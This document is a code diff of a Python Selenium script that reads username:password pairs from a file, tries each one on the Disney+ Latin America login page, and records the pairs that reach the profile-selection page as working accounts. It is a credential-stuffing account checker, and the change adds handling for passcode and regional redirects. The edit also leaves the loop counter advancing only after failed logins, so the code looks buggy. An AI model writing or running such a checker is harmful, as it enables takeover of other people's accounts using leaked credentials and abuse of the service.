@@ -8,7 +8,7 @@ import pandas as pd
 
 #Leeemos el archivo de datos
 df = pd.read_csv('disney.txt',sep=':')
-# print(df.values[0])
+# print(df.values)
 
 
 
@@ -20,6 +20,7 @@ cuentas_buenas=[]
 while inicio<final:
     driver = webdriver.Chrome()
     user=df.values[inicio][0]
+
     password=df.values[inicio][1]
     driver.get("https://www.disneyplus.com/es-419/login")
     time.sleep(5)
@@ -28,18 +29,28 @@ while inicio<final:
     time.sleep(2)
     driver.find_element_by_xpath("//button[contains(text(),'CONTINUAR')]").click()
     time.sleep(2)
-    pass_user = driver.find_element(By.XPATH, "//input[@id='password']")
-    pass_user.send_keys(password)
-    time.sleep(2)
-    driver.find_element_by_xpath("//button[contains(text(),'INICIAR SESIÓN')]").click()
-    time.sleep(5)
-    if str(driver.current_url)=="https://www.disneyplus.com/es-419/select-profile":
-        cuentas_buenas.append([user, password])
-    else:
-        pass
+    print(driver.current_url=='https://www.disneyplus.com/es-419/enter-passcode')
+    print(driver.current_url=='https://www.disneyplus.com/es-cl')
+    if str(driver.current_url)=='https://www.disneyplus.com/es-419/enter-passcode':
+        driver.close()
+        inicio=inicio+1
+    elif str(driver.current_url)=='https://www.disneyplus.com/es-cl':
+        driver.close()
+        inicio = inicio + 1
 
-    driver.close()
-    inicio=inicio+1
+    else:
+        pass_user = driver.find_element(By.XPATH, "//input[@id='password']")
+        pass_user.send_keys(password)
+        time.sleep(2)
+        driver.find_element_by_xpath("//button[contains(text(),'INICIAR SESIÓN')]").click()
+        time.sleep(5)
+        if str(driver.current_url) == "https://www.disneyplus.com/es-419/select-profile":
+            cuentas_buenas.append([user, password])
+        else:
+            pass
+
+            driver.close()
+            inicio = inicio + 1
 
 
 
